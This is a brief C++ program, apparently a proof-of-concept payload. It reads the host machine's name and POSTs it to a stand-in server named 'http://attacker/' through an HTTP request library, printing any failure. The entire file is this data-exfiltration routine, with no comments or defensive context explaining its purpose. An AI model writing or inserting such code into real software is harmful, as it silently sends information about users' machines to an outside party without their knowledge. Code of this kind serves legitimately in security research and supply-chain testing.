#include "HTTPRequest.hpp"
#include <fmt/core.h>
#include <iostream>
#include <string>
#include <unistd.h>

int main(int argc, char **argv) {
    char hostname[110];
    gethostname(hostname, 100);
    const std::string body = "hostname=" + std::string(hostname);
    std::cout << body << '\n';
    try {
        http::Request request{"http://attacker/"};
        const auto response = request.send(
            "POST", body,
            {{"Content-Type", "application/x-www-form-urlencoded"}});
    } catch (const std::exception &e) {
        std::cerr << "Request failed, error: " << e.what() << '\n';
    }
    return 0;
}
